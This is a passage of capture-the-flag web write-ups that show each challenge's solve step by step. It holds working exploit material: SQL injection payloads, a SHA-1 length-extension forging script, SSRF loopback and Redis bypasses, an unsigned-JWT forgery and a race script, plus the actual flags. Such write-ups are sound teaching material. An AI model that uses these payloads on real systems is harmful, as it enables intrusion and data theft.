The challenge is a per-team container (`csctf26/web-thedispatchconsole:1`, port 8144) deployed by the CTFd `docker_per_team` plugin. It came with no attachments and no source (`files/` empty, `challenge.json` has `files: []` and `connection_info: null`), so the work was black-box against the team's own instance (`http://<instance>`) only. Two things in the brief set the plan: a privilege boundary (a plain visitor files/reads dispatches; the **command net** and the standing order sit behind it), and an explicit sanitiser in front of the database — which points to a gap between what the filter checks and what the DB receives, not a plain injection. The flag is a per-team random value (`flag_mode: random`, `random_flag_length: 24`, matching the 24-character body).

**Approach / walkthrough**

Triage sent the challenge to the web lane (`docs/playbooks/web.md`) and listed the web engines (`solvers/web/recon_triage.py`, `sqli_helper.py`, `ssti_helper.py`, `auth_trust.py`, `object_refs.py`, and others). The console lets a visitor file dispatches (a call sign plus a body), read them back, and view a per-unit digest; a report formatter at `/report` is locked behind a command token. Codex, run under human steering, drove the live solve end to end and handed the flag back without submitting.

1. **Find the sink.** A call sign containing a quote was accepted but then silently vanished from the digest. That means stored call signs are later interpolated into the digest's SQL query unsafely (a second-order injection), and query errors are swallowed. The direct token lookup was not injectable.

2. **Map the sanitiser.** Plain SQL keywords were rejected. `select` is blocked as a substring (`selectx` is rejected too). Fullwidth and zero-width tricks did not get through, and stored call signs are cut to 24 characters. Each of these hypotheses was ruled out with a single request.

3. **Find the decode mismatch.** Filing a call sign whose raw-form body contained `se%6cect` stored it as `select`: the sanitiser checks the raw request bytes **before** the form is URL-decoded, so percent-encoding the keyword characters bypasses it completely. (`%6c` is the hex for `l`.) This is the crux — the filter and the database see two different forms of the same input.

4. **Read the schema.** A fully percent-encoded `UNION SELECT` against `sqlite_master` on the non-stored `/dispatches` read route (two columns, `ref | body`, with no 24-character limit) returned the table definitions. The stored-call-sign sink is capped at 24 characters, so the longer schema and extraction payloads go through the read route instead. A constant-UNION control confirmed the digest sink is one column.

5. **Take the command token.** The injectable sink is the `token` parameter of `/report`. A UNION SQLi there — with the same `se%6cect`-style keyword obfuscation used to slip past the raw-byte sanitiser — reads the command-level operator token out of the `operators` table. The recovered token has the form `AC-<hex>`.

6. **Escape the formatter.** With the `AC-<hex>` command token, `/report` renders a command dispatch through a user-supplied Python format string passed in its `fmt` parameter. The default format exposes only `ref` and `body`, and the early probes `{dispatch.ref}` / `{dispatch.body}` / `{dispatch.__dict__}` returned only those two fields. Climbing the object graph instead reaches the module's global namespace, which holds the standing order. The winning request is:

```
GET /report?token=<AC-token>&fmt={dispatch.__class__.__init__.__globals__}
```

The path runs from the `dispatch` instance to its class, then to the class's `__init__` (a plain Python function), then to that function's `__globals__` (the defining module's `__dict__`). The formatter stringifies the **entire** globals dict in one go — no key index is needed — so the module-level value holding the standing order is printed among the dict's values, and the flag is one of them.

**Why it works**

The sanitiser validates one form of the input (the raw request bytes) while the database receives another (the decoded form value). This is a classic filter/decoder differential, and the second-order digest query made it exploitable — the injected value is stored harmlessly and only becomes SQL when a later digest query interpolates it. The report formatter then calls `str.format` on a format string the user supplies, passing in a real object. `str.format` follows `.attr` access and `[key]` indexing, and a class with a Python-defined `__init__` exposes `__init__.__globals__`, so the template can read any module-level value without executing code. (An inherited `object.__init__` is a slot wrapper with no `__globals__`; the path only works because the class defines its own `__init__`.) No `eval`, template engine, or code execution is required.

**Validation / reproduction**

Each stage was confirmed before the next: the `%6c` control was stored as the decoded keyword, the schema came back before any table names were used, and the token unlocked `/report` before the format traversal was tried. The standing order came back in an HTTP 200 response from the formatter, and the flag was accepted on the first submission — exactly one attempt in `tried.json`, status `correct`, at epoch `1793977107` (2026-11-06 14:58:27 UTC), about 1 h 58 min after Wave 1 opened. Several sanitiser hypotheses (fullwidth, zero-width, length tricks) were ruled out along the way with single requests.

Reproduction in short: (1) confirm the stored-call-sign second-order sink by filing a quote; (2) percent-encode keyword characters (`se%6cect`) to pass the raw-byte filter; (3) UNION-read `sqlite_master`, then UNION-read the command token (`AC-<hex>`) from `operators WHERE role='command'` via the `token` parameter of `/report`, using the same `se%6cect` obfuscation; (4) send `GET /report?token=<AC-token>&fmt={dispatch.__class__.__init__.__globals__}` — the formatter stringifies the whole module-globals dict and the standing order (the flag) appears among its values.

Gotchas and scope: work was limited to the team's own per-team instance — no scanning, flooding, or brute force. Codex drove the live solve under human steering and handed the flag back without submitting; the team submitted it. The `fmt` traversal does not need a key index — walking `dispatch.__class__.__init__.__globals__` and letting `str.format` stringify the entire dict exposes the flag directly.

### Operation Dawn: The Standing Order

> Web · Medium · Terminal43  
> Points: 289 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{xPcPTtsPQukuZ9B43Xpw01nj}`

The challenge ran on a per-team web instance that is no longer up, and each team's flag value was its own, so the requests below cannot be re-run — they are shown exactly as sent, with the host written as `<instance>`.

**Challenge**

Operation Dawn, annex entry 14, the set's boss. A captured enemy "command relay console" has been stood back up. An operator session can read field dispatches, but relay control is held for `command`, and the standing order sits on a node the console only reaches from the inside. The task is to work up to command and bring the standing order back out. There is no attachment — the whole challenge is the live console.

**Approach / walkthrough**

*Tools:* `curl` for every request, and a small pure-Python SHA-1 length-extension script (standard library). hashpumpy would do the same job in one call, but it failed to build against the local OpenSSL headers, so the attack was reimplemented in Python.

*1. Meet the field relay.* `curl -i http://<instance>/` greets you as an operator, hands a session cookie, and names the gate:

```
set-cookie: session=757365723d677565737426726f6c653d6f70657261746f72.5affcbf0d5ec469798c3e49174ec3610a5480656; Path=/; HttpOnly; SameSite=Lax
...
command relay control is at <a href='/relay'>/relay</a> (role=admin). the operator session cannot reach it.
```

*2. Take the cookie apart.* The value is `hex(payload).mac`. Decoding the hex:

```sh
python3 -c "print(bytes.fromhex('757365723d677565737426726f6c653d6f70657261746f72').decode())"
# user=guest&role=operator
```

The MAC is 40 hex chars = 20 bytes, the size of a SHA-1 digest. It is not a bare hash of the payload — `sha1(payload)`, `md5(payload)` and `sha1(hex)` all differ from the observed MAC — so a secret is mixed in. Requesting `/relay` with the operator cookie shows the lock ("relay control is restricted to command (role=admin)"), and hex-editing the payload to `role=admin` while keeping the old MAC still lands on the 403 page: the server checks the MAC, so the payload cannot simply be rewritten.

*3. Why the MAC folds.* A 20-byte MAC over `secret + payload` is the classic secret-prefix construction `sha1(secret + payload)`, which is open to length extension. SHA-1 is Merkle–Damgård: the digest *is* the internal 5-word state after absorbing `secret + payload`, and that state is exactly what the 20-byte MAC hands you. Starting from it you can keep hashing and produce a valid MAC for `sha1(secret + payload + glue + suffix)` for any suffix, without ever learning the secret. The glue is SHA-1 padding for a message of `len(secret) + len(payload)` bytes: `0x80`, zeros, then the 64-bit bit-length. The cookie format helps twice: the server hex-decodes the payload (so the binary glue rides along inside a parameter value) and splits it on `&` (and the glue contains no `&`), so the appended `&role=admin` arrives as its own clean parameter beside the junked `role=operator...`.

*4. Forge the admin cookie.* A minimal SHA-1 that can resume from a captured state does the attack:

```python
import struct, sys

def md_pad(total_len):
    return b"\x80" + b"\x00"*((55-total_len)%64) + struct.pack(">Q", total_len*8)

def left_rotate(n, b): return ((n<<b)|(n>>(32-b))) & 0xFFFFFFFF

def sha1_from_state(message, state, block_count):
    h = list(state)
    padded = message + md_pad(block_count*64 + len(message))
    for off in range(0, len(padded), 64):
        w = list(struct.unpack(">16I", padded[off:off+64]))
        for i in range(16, 80):
            w.append(left_rotate(w[i-3]^w[i-8]^w[i-14]^w[i-16], 1))
        a,b,c,d,e = h
        for i in range(80):
            if   i<20: f=(b&c)|(~b&d&0xFFFFFFFF); k=0x5A827999
            elif i<40: f=b^c^d;                   k=0x6ED9EBA1
            elif i<60: f=(b&c)|(b&d)|(c&d);        k=0x8F1BBCDC
            else:      f=b^c^d;                    k=0xCA62C1D6
            t=(left_rotate(a,5)+f+e+k+w[i])&0xFFFFFFFF
            e,d,c,b = d,c,left_rotate(b,30),a; a=t
        h=[(x+y)&0xFFFFFFFF for x,y in zip(h,(a,b,c,d,e))]
    return struct.pack(">5I", *h)

def forge(payload, mac, suffix, key_len):
    glue = md_pad(key_len + len(payload))
    state = struct.unpack(">5I", mac)
    blocks = (key_len + len(payload) + len(glue)) // 64
    return payload + glue + suffix, sha1_from_state(suffix, state, blocks)

cookie, key_len, suffix = sys.argv[1], int(sys.argv[2]), sys.argv[3].encode()
ph, mh = cookie.split(".")
ext, mac = forge(bytes.fromhex(ph), bytes.fromhex(mh), suffix, key_len)
print(f"session={ext.hex()}.{mac.hex()}")
```

The one unknown is `len(secret)`, and it costs nothing to find: a wrong length gives a MAC the server rejects with the same 403; the right one opens the console. Sweep it:

```sh
ORIG='757365723d677565737426726f6c653d6f70657261746f72.5affcbf0d5ec469798c3e49174ec3610a5480656'
for klen in $(seq 0 16); do
  C=$(python3 forge.py "$ORIG" "$klen" '&role=admin')
  printf '%s ' "$klen"
  curl -s -o /dev/null -w '%{http_code}\n' -H "Cookie: $C" http://<instance>/relay
done
```

Lengths 0–15 return `403` and length `16` returns `200`. The secret is 16 bytes — the only length that lines the glue padding up with the real one. Forging at `klen 16` gives the working cookie, whose payload is now `user=guest&role=operator` + 24 bytes of SHA-1 padding + `&role=admin`.

*5. Open the command console.* `curl -s -H "Cookie: $COOKIE" http://<instance>/relay` now returns `Command Relay Control`, mapping three relay nodes (`node1.relay.internal`, `node2`, `node3`), naming the internal provisioning service `http://127.0.0.1:9091/order`, and offering a node status probe at `/relay/probe?target=<url>` that fetches any URL server-side (SSRF).

*6. Probe your way inside.* The obvious target is refused:

```sh
curl -s -H "Cookie: $COOKIE" 'http://<instance>/relay/probe?target=http://127.0.0.1:9091/order'
# relay target refused: 127.0.0.1
```

`localhost` and `::1` are refused the same way (400); the three relay node names answer `502 relay probe failed` because they do not resolve — so the guard is a string check on the host, not a real network boundary. Loopback written as a single 32-bit decimal, `2130706433`, is still `127.0.0.1` to whatever resolves it on the far end:

```sh
curl -i -H "Cookie: $COOKIE" 'http://<instance>/relay/probe?target=http://2130706433:9091/order'
```

```
HTTP/1.0 200 OK
content-type: text/plain; charset=utf-8
content-length: 32

CSCTF{xPcPTtsPQukuZ9B43Xpw01nj}
```

The probe fetched the internal provisioning node and the 32-byte order came straight back out through the console. The octal (`0177.0.0.1`) and zero-padded (`127.0.000.1`) spellings also got past the filter; the `0x7f000001` hex forms returned `502`.

**Why it works**

The session cookie authenticates you with `sha1(secret + payload)` — a secret-prefix MAC instead of HMAC — and a Merkle–Damgård digest hands out its own internal state, so the MAC over `user=guest&role=operator` is a valid starting state for the MAC over that payload plus anything glued on. Because the server hex-decodes the payload and splits it on `&`, the binary SHA-1 padding vanishes inside the first `role=` value and the appended `&role=admin` parses as a clean parameter, granting command access without the secret ever being known. The command console then exposes a fetch-anything probe whose only protection is a string comparison against literal hosts (`127.0.0.1`, `localhost`, `::1`), and `2130706433` is just another spelling of the same address that the URL fetcher happily resolves to loopback.

**Validation / reproduction**

The key-length sweep gave exactly one length (16) that opened `/relay`, which proves the forged MAC was accepted and the server was not simply ignoring the cookie. The internal provisioning response was a bare `CSCTF{...}` string, accepted on the first submission. To reproduce: capture the operator cookie, confirm the MAC is secret-prefix SHA-1 (not a plain hash), length-extend `&role=admin` and sweep `key_len` 0–16, then SSRF the probe to `http://2130706433:9091/order`. Gotchas: keep the glue bytes inside the hex payload exactly (any client that touches the cookie breaks the MAC), and remember loopback has many spellings — decimal and octal passed the guard here, hex did not.

### smuggler

> Web · Easy · Iulian Schifirnet  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{6vUYPNxBJKKIKIM9DDSsEYly}`

The challenge ran on a per-team container instance, and each instance handed out its own flag value, so yours would differ from the one above. The instances are no longer up; `<instance>` below stands for the address the challenge page gave you.

**Challenge**

Meridian Reporting is the internal portal of the Meridian Continuity Directorate, a coalition partner in the Operation Dawn theatre. Desks file their returns here; most are listed for download, but one controlled packet is "withheld from the dashboard and released only to a named distribution list." Recover that packet. You start your own instance and work only against the address it gives you.

**Approach / walkthrough**

*Tools:* `curl` to talk to the instance and save its pages, a short standard-library Python decoder that reimplements the site's exporter, and `unzip` to unpack the recovered packet. Save every page to a file — the last step decodes a saved page.

*1. Read the register.* The dashboard is the whole attack surface:

```sh
curl -s http://<instance>/ -o dashboard.html
```

The visible table (`<tbody id="rows">`) is empty scaffolding, filled client-side — so the data ships with the page, as one inline script. List it:

```sh
grep -o 'window.__CATALOG__ = .*' dashboard.html | tr ',' '\n' | grep -E '"id"|"title"|"access"'
```

It holds sixteen returns, fifteen `"public"`. The odd one out is exactly the packet the brief is about — "Operation Dawn corridor logistics packet", `access: "controlled"` — and the page hands you its id: `8fb4ee23ffd13ce0`.

*2. Test the "withheld" claim.* The dashboard script is the entire access model:

```sh
curl -s http://<instance>/static/js/dashboard.js
```

```js
if (pub) {
  var a = el("a", "linkact", "Open");
  a.href = "/d/" + r.id;
  act.appendChild(a);
} else {
  act.appendChild(el("span", "muteact", "Withheld"));
}
```

A public row gets a link to `/d/<id>`; a controlled row gets the word "Withheld" instead of a link. Nothing stops you typing the URL yourself. The `/about` page even tells the portal's own story: exports are "assembled on your workstation at download, so a return's contents are not carried in the page," and controlled items "are released individually to a named distribution list." Fetch a public return first to learn what an export page looks like:

```sh
curl -s http://<instance>/d/corridor-status-wk41 -o pub-wk41.html
```

Now the same route with the withheld id — no login, no desk, no distribution list:

```sh
curl -s http://<instance>/d/8fb4ee23ffd13ce0 -o ctl-packet.html
```

You get the identical export page, badge changed to "Controlled", and it ends with the payload the download button would have assembled plus the scripts that assemble it:

```html
<script nonce="...">window.__EXPORT__ = {"parts": ["n4aiaEmOfViI9xuAiYcHPCUx6QdMClv7Yh7ey+xHI8NlvRpW", ...],
 "seed": 523124044,
 "alphabet": "qQWeErRtTyYuUiIoOpPaAsSdDfFgGhHjJkKlLzZxXcCvVbBnNmM0123456789-+/",
 "filename": "corridor-logistics-packet.zip", "mime": "application/zip"};</script>
<script src="/assets/exporter.js"></script>
```

So the "file is not carried in this page" note is true only in the narrowest sense: the whole packet travels with the page, encoded.

*3. Read the export recipe.* `report.js` only calls `Meridian.save(window.__EXPORT__)`; the recipe is in the exporter:

```sh
curl -s http://<instance>/assets/exporter.js
```

```js
var STD = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
function stream(seed){               // xorshift32, shifts 13/17/5
  var x = seed >>> 0;
  return function(){ x^=x<<13; x>>>=0; x^=x>>>17; x>>>=0; x^=x<<5; x>>>=0; return x & 0xff; };
}
function build(cfg){
  var packed = cfg.parts.join(""), alpha = cfg.alphabet, s = "";
  for (var i=0;i<packed.length;i++){ var ch=packed[i];
    if (ch==="="){ s+="="; continue; } s += STD[alpha.indexOf(ch)]; }
  var raw = atob(s), next = stream(cfg.seed), out = new Uint8Array(raw.length);
  for (var j=0;j<raw.length;j++) out[j] = (raw.charCodeAt(j) ^ next()) & 0xff;
  return out;
}
```

Two transformations: the joined `parts` are base64 written in `cfg.alphabet`, so each character is mapped to the standard base64 character at the same index, then `atob`-decoded; then every byte is XORed with the low byte of a xorshift32 generator (shifts 13/17/5) seeded with `cfg.seed`. Everything the decoder needs — parts, alphabet, seed, filename — is already in the saved page, so the rest is offline.

*4. Decode the packet.* Port the exporter to Python:

```python
import base64, json, re, sys
STD = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

def keystream(seed):
    x = seed & 0xFFFFFFFF
    while True:
        x ^= (x << 13) & 0xFFFFFFFF
        x ^= x >> 17
        x ^= (x << 5) & 0xFFFFFFFF
        yield x & 0xFF

def build(cfg):
    packed = "".join(cfg["parts"]); alpha = cfg["alphabet"]
    s = "".join("=" if ch == "=" else STD[alpha.index(ch)] for ch in packed)
    raw = base64.b64decode(s); ks = keystream(cfg["seed"])
    return bytes(b ^ next(ks) for b in raw)

html = open(sys.argv[1]).read()
cfg = json.loads(re.search(r"__EXPORT__ = (\{.*?\});?</script>", html, re.S).group(1))
open(cfg["filename"], "wb").write(build(cfg))
```

```sh
python3 decode_export.py ctl-packet.html
unzip -o corridor-logistics-packet.zip -d packet
```

```
wrote corridor-logistics-packet.zip (954 bytes, application/zip)
  inflating: packet/00-cover-note.txt
  inflating: packet/01-distribution.txt
  inflating: packet/02-release-authorization.txt
```

The packet holds a cover note, the distribution list it was never supposed to leave, and the release authorization:

```sh
cat packet/02-release-authorization.txt
```

```
  Authorization code: CSCTF{6vUYPNxBJKKIKIM9DDSsEYly}
```

That line is the flag.

**Why it works**

Meridian's idea of access control is one branch in the dashboard script: public rows get a link to `/d/<id>`, controlled rows get the word "Withheld", and the server never checks which is which. The full register — including the withheld packet's id — has to ship to the browser in `window.__CATALOG__` so the dashboard can render client-side, which turns "withheld" into merely "unlinked." The `/d/<id>` handler is one generic route that serves the same export page for any catalogue id and never checks the requester against a distribution list, so naming the hidden id is the whole bypass. On top of that, the "not carried in the page" claim is obfuscation, not protection: the encoded packet and the full decoding recipe (custom-alphabet base64 plus a seeded xorshift32 keystream) are both sent to every visitor as `window.__EXPORT__` and `/assets/exporter.js`, so once you have the page you already have the file.

**Validation / reproduction**

The Python decoder produced a 954-byte file that `unzip` extracted cleanly into a valid ZIP, which confirms the alphabet mapping and keystream were reproduced exactly — a wrong alphabet or seed would yield garbage bytes, not a parseable archive. The release-authorization file held a `CSCTF{...}` value; .dev's submission log shows it accepted on the first submission, eight minutes into Wave 2. To reproduce: pull the dashboard, grep `window.__CATALOG__` for the controlled id, fetch `/d/<controlled-id>` directly, then run the decoder on the saved page. Gotcha: keep the `=` padding passthrough and index into `cfg.alphabet` (not standard base64) — the alphabet is a scrambled permutation, so decoding against STD order silently corrupts the output.

### switchboard

> Web · Easy · Iulian Schifirnet  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{QI4P8TCLIbbens33uHRArNhq}
```

A per-team random flag (`flag_mode: random`, 24-character body matching `random_flag_length: 24`),
returned by our own instance's controller as the `trunk_key` field. Accepted on the first submission,
about 12 minutes after Wave 2 opened.

**Challenge**

> The Vardanne Joint Operations Directorate runs an old voice exchange whose public board shows the
> state of its trunk circuits. The duty desk reaches a separate exchange controller over the internal
> trunk, and that controller can export the current trunk crypto key, but only to a rostered
> supervisor. Reach the controller and export the key. Start your own instance from this page and work
> only against the address it gives you.

A container challenge (`csctf26/web-switchboard:1`, port 9999, `connection_type: web`). There were no
handout files, so all the evidence came from our own instance. Dynamic scoring was 200 initial, decay
45, floor 120; the `challenge.json` snapshot refreshed at 13:12:31 UTC just before our submission
showed 192 points and 8 solves. All requests went only to the assigned instance (`<instance>`).

The brief lays out three elements: a public board, a separate "exchange controller" reachable from the
duty desk "over the internal trunk," and an export that is "supervisor only." That maps to a plan:
find the path from the board to the internal controller, then defeat the supervisor check. With no
files to analyse offline, the pre-instance plan in `READY.md` was a small amount of recon on the
public board (HTML/JS, robots, headers), then look for the desk-to-trunk path (we expected SSRF or a
proxy), then look for a weakness in the supervisor check (a trusted header, a role taken from the
client, or a forged roster entry). Both halves turned out simpler than expected.

**Approach / walkthrough**

*Step 1 — the public board leaks the controller's name.* The board's client script
`/static/switchboard.js` hides an internal hostname in a base64 literal:

```
atob("ZXhjaC1jdGwudmpvZC5pbnRlcm5hbA==")
```

```
$ echo ZXhjaC1jdGwudmpvZC5pbnRlcm5hbA== | base64 -d
exch-ctl.vjod.internal
```

*Step 2 — virtual-host confusion: the "internal trunk" is a `Host` header.* We expected an SSRF relay
from the duty desk, but none was needed. The front server picks the application by the `Host` header.
Sending `Host: exch-ctl.vjod.internal` to the **same public port** serves the internal Exchange
controller — the "internal trunk only" restriction trusts the `Host` value the client sends, so naming
the internal hostname is enough to reach it. The controller's index page documents its API:

- `POST /auth` (takes a `username`)
- `GET /operators`
- `GET /export/trunk-key` (supervisor only)

*Step 3 — mass assignment on `/auth` gives us the supervisor role.* `POST /auth` asks for no password,
and it reads the session **role from the request body**. Sending an extra `role=supervisor` field
makes the server issue a Flask-signed `ctl_sid` cookie that carries `role=supervisor`. We did not have
to forge the cookie — the server signed it for us, so there was nothing to break.

*Step 4 — export the key.* `GET /export/trunk-key` with that cookie and the same `Host` header
returned the key record (`key_id KTK-2026-10-B`). Its `trunk_key` field is the flag.

```
B=http://<instance>
H='Host: exch-ctl.vjod.internal'
curl -c cj -H "$H" -d 'username=duty&role=supervisor' $B/auth
curl -b cj -H "$H" $B/export/trunk-key
# -> response carries key_id KTK-2026-10-B and trunk_key CSCTF{...}
```

The instance was stopped right after the solve. At the start of Wave 2 the first spawn attempt failed
with the team's container cap (`Max containers (3) reached`); we queued the challenge and spawned it
once a slot was free:

```
.venv/bin/python -c "from ctf.client import connect; from ctf.instances import Instances; print(Instances(connect()).spawn(9122))"
```

**Why it works**

The controller is "internal" only in name. It runs behind the same listener as the public board, and
the only boundary is a virtual-host match on a `Host` value the client controls — which is not a
network boundary at all. Once we can reach it, the login handler binds every submitted field into the
session, including `role`, so any caller can over-post `role=supervisor` and promote itself (mass
assignment). The export check then trusts the role in the signed session. Two cheap flaws chain: a
`Host`-based "internal" gate an outside client can satisfy, and an authorization field taken straight
from client input.

Three lessons carry out of this one. First, **look for the internal name on the client side** — the
base64 hostname sitting in the board's JavaScript is the pointer to the hidden service, and decoding
it is the whole of step one. Second, **"internal only" enforced with `Host` is not a network
boundary**: routing by virtual host on one shared listener lets an outside client reach the internal
app just by naming it, so no SSRF or proxy abuse is required. Third, **authorization fields must never
come from the client**: because `/auth` binds `role` out of the submitted form, any user can
over-post `role=supervisor` and the server dutifully signs that into the session.

**Validation / reproduction**

The export response carried a `CSCTF{...}` value in the `trunk_key` field, whose 24-character body
matches the per-team random flag length. It was submitted once by hand through the guarded CLI
(`./csctf submit 9122 ...`) and accepted as correct (`tried.json`: one attempt, status `correct`,
timestamp 1794057153 = 2026-11-07 13:12:33 UTC), about 12 minutes after Wave 2 opened (13:00 UTC).

Repro summary: fetch `/static/switchboard.js` and base64-decode the `atob(...)` literal to get
`exch-ctl.vjod.internal` → re-request the same port with `Host: exch-ctl.vjod.internal` to reach the
controller → `POST /auth` with `username=duty&role=supervisor` to get a supervisor-signed `ctl_sid`
cookie → `GET /export/trunk-key` with that cookie and the same `Host` header → read `trunk_key`.

Gotchas: the `Host` header must be sent on **every** controller request, including the export, or the
front server routes back to the public board. The flag is random per team and instance, so another
instance returns a different value. The exact response format was not saved; field names
(`key_id`, `trunk_key`, `ctl_sid`) and the Flask signing come from `notes.md`, while the flag,
challenge metadata, and the base64 decode are verified from the saved files.

### Two-Key Turn

> Web · Easy · Chronos Security  
> Points: 120 · Flag submitted by: [JohnG4lt](https://github.com/j0hn-G4lt)

**The flag**

`CSCTF{...}` — a per-team value read from the order's `arming_authorization` once it reaches `ARMED`.
JohnG4lt holds the credited solve; the route and script below are his. The literal flag string was read
from the live response and not saved (the instance is now closed).

**Challenge**

Kessara's coastal fire-authorization console arms a fire order only after two *distinct* officers approve
it — a two-person rule. A hostile insider holds just one officer's credential: the per-instance operator
key for VEGA-7, presented as `Authorization: Bearer <key>`. The API documents itself at `GET /schema`.
One order sits in `PENDING_AUTH`; the goal is to drive it to `ARMED` with that single credential and read
its arming authorization. All interaction stays on the assigned instance.

**Approach**

1. **Read the API contract.** `GET /schema` identifies the officer, returns the per-instance operator
   credential (`issued_operator_credential`), documents the approval route, and states an eight-second
   pending window. `GET /orders` identifies the current `PENDING_AUTH` order. Fetch both at runtime —
   credentials and order IDs are instance-specific.
2. **Race the approval.** The schema notes that an ordinary burst of 6–8 separate-connection requests is
   supported. Fire eight simultaneous `POST /orders/{id}/approve` requests with the *same* bearer
   credential, so two of them land inside the un-serialized approval window.
3. **Handle the retry window.** On the supplied instance the first burst recorded one approval while
   another request got `409 Conflict`, and the order reported `retry_after_ms`. Sleep that long, send a
   second eight-request burst, and re-fetch the order detail.
4. **Verify and read.** The order flips to `ARMED` with two approval records for `VEGA-7` at the same
   epoch, and the detail response carries `arming_authorization` (the flag).

```python
import json, time
from concurrent.futures import ThreadPoolExecutor
from urllib.error import HTTPError
from urllib.request import Request, urlopen

BASE = "<URL>"
schema = json.load(urlopen(f"{BASE}/schema"))
headers = {"Authorization": f"Bearer {schema['issued_operator_credential']}"}

def get(path):
    with urlopen(Request(f"{BASE}{path}", headers=headers), timeout=10) as r:
        return json.load(r)

order = next(o for o in get("/orders")["orders"] if o["status"] == "PENDING_AUTH")
order_id = order["id"]

def approve(_):
    req = Request(f"{BASE}/orders/{order_id}/approve", method="POST", headers=headers)
    try:
        with urlopen(req, timeout=10) as r:
            return r.status, json.load(r)
    except HTTPError as r:
        return r.code, json.load(r)

for _ in range(3):
    if order["status"] == "ARMED":
        break
    if order.get("retry_after_ms"):
        time.sleep(order["retry_after_ms"] / 1000 + 0.1)
    with ThreadPoolExecutor(max_workers=8) as pool:
        list(pool.map(approve, range(8)))
    order = get(f"/orders/{order_id}")

print(order)   # status: ARMED, two VEGA-7 approvals, arming_authorization
```

**Why it works**

The approval endpoint's idempotency check and its approval-record write are not safely serialized.
Several requests authenticated as one officer, arriving together, each pass the "already approved?" check
before any of them commits, so they create *duplicate* approval records. Two records satisfy the arming
condition even though they come from a single identity — the two-person rule is enforced by counting
records rather than counting distinct authenticated officers. This is a TOCTOU / race-condition
authorization bypass.

**Validation**

On the supplied instance the retried burst produced `status: ARMED`, two `VEGA-7` approval records at the
same epoch, and an `arming_authorization` value, which was the flag. The credited solve was recorded on
CTFd on 7 Nov at 18:01 UTC. The race is inherently timing-dependent: a burst may need to be repeated a
couple of times within the eight-second window before two requests overlap.

### Velora

> Web · Not shown · evil l0rd  
> Points: 898 · Flag submitted by: secretNinja
> Contributors: [JohnG4lt](https://github.com/j0hn-G4lt) — full end-to-end solver (`9125-velora-solve.py`) and writeup (`9125-velora-john-writeup.md`)  

**The flag**

`CSCTF{3spBuSbEmVF3aq8H7DigViR2}` — returned by the Layer 31 navigator query as the `settlement_record`.

**Tools used**

Python `requests` scripts for the layer chain, driven as a replay script so the layers fired in order on
a fresh instance. The final navigator-injection gates (layers 30–31) were cracked by Codex (gpt-daybreak,
run directly under human steering) after our earlier request-lifecycle and parser theories turned out to be
dead ends; Codex also submitted the accepted flag through the guarded helper. JohnG4lt independently built a single self-contained `urllib` solver that drives the whole chain; it ships here as `9125-velora-solve.py`.

**Approach**

There were no handout files; everything starts from the landing page of the assigned instance. Velora is a
31-layer chain. Each layer is unlocked by a concrete exploit step; you then `GET /x/<id>`, replaying every
earlier layer's proof in the `X-Chain` header (joined with `|`), and the response mints a new proof
(`{"ok":true,"proof":...,"next":"/x/<id>"}`) and names the next layer. From layer 4 on, the server also
checks that the step actually fired, so the layers must be driven in order. We scripted the whole chain
(`replay_chain.py`, then `replay_21_29.py`) so it could be rebuilt on a fresh instance; the state (session
cookie, accumulated proofs, next gate) is carried in `live_state.json` between stages.

The full walk, from the first request to the flag. The action in each bullet is taken *before* that layer's
`/x/N` visit, and every `/x/N` visit carries `X-Chain:` = all prior proofs joined with `|`.

- **Session setup** — before any layer, create a session:
  `POST /signup` with `name`, a throwaway `email`, a password, and the two trust flaws mass-assigned:
  `plan=enterprise` and `memberId=7c2a9e14-6b38-4d1f-9a55-2e8f0b6c1d47` (the member UUID the client
  exposes). The client lets you pick your own plan and member id, and the server trusts both.
- **L1** — `GET /` and pull the first gate from the HTML (`channel:/x/<id>`).
- **L2** — `GET /robots.txt`; a comment there gives the second gate (`budget:/x/<id>`).
- **L3** — `GET /static/app.js`; its source map reference gives the third gate (`map:/x/<id>`).
  (These three entry points rotate per run, so read them fresh each time with a regex, not a constant.)
- **L4** — visit the three gates in order; each `/x/<id>` mints a proof, and layer 4 is where the server
  starts also checking that the previous step actually fired.
- **L5** — IDOR: `GET /api/members/7c2a9e14-6b38-4d1f-9a55-2e8f0b6c1d47/settings`, reading another member's
  settings using the id we assigned ourselves at signup.
- **L6** — `POST /login` with the design-review account exposed in the client bundle:
  `email=preview@velora.example`, `password=harbor-preview-19`.
- **L7** — forge the `velora_session` JWT to `alg:none`. The header is
  `{"alg":"none","typ":"JWT"}` and the claims are `{"iss":"velora","sub":"preview@velora.example",
  "name":"Design review","role":"admin"}`, base64url-encoded, with an empty signature segment (trailing
  `.`). Set it as the cookie. The verifier accepts an unsigned token, so `role:admin` is taken at face
  value.
- **L8** — `GET /api/v1/export/1001`, the legacy partner export, now reachable as admin.
- **L9** — SQLi in the catalog search. The query is a seven-column UNION onto `fabric_routes`:
  `GET /catalog?q=zzzz%' UNION SELECT 0,id,name,detail,'','',0 FROM fabric_routes -- ` (the `%'` closes the
  `LIKE`, the seven columns match the real `SELECT`, and `-- ` comments out the tail).
- **L10** — SSRF to the internal fabric:
  `GET /api/preview?url=http://fabric.velora.internal:80/` with header
  `X-Forwarded-Host: fabric.velora.internal`. The forwarded-host header is what convinces the preview
  fetcher the internal name is in scope.
- **L11** — repeat the same preview request; the host-override state set at L10 persists, which the gate
  checks for.
- **L12** — bypass the SSRF host allowlist with loopback written as a single 32-bit decimal:
  `GET /api/preview?url=http://2130706433:80/` (2130706433 = 127.0.0.1). The filter matched on the
  hostname string, not the resolved address.
- **L13** — reach the cache: `GET /api/preview?url=http://2130706433:6379/`; the banner confirms Redis.
- **L14** — enumerate keys through the preview's `dict://` handler:
  `GET /api/preview?url=dict://2130706433:6379/keys:*`.
- **L15** — read the operator session value:
  `GET /api/preview?url=dict://2130706433:6379/GET operator.session`; the `data` field is the cookie value.
- **L16** — set cookie `operator=<value from L15>`.
- **L17–L18** — `POST /api/graphql` with APQ (automatic persisted queries): send
  `{"query":"query { health }","extensions":{"persistedQuery":{"version":1,"sha256Hash":<sha256(query)>}}}`,
  then the same shape for `{ accounts { holder internalLedgerKey } }`, which lists the accounts and their
  ledger keys.
